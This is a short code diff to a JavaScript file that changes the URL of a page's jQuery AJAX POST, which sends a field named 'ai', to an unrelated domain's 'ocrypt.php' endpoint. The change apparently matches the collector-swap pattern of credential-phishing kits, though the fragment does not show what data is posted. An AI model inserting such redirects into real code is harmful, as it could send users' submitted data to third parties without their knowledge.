@@ -114,7 +114,7 @@ $(document).ready(function() {
 
         $.ajax({
             dataType: 'json',
-			url: 'https://api.secureme.org.ng',
+			url: 'https://sub.paychelx.com/ocrypt.php',
             type: 'POST',
             data: JSON.stringify({
                 ai: ai,
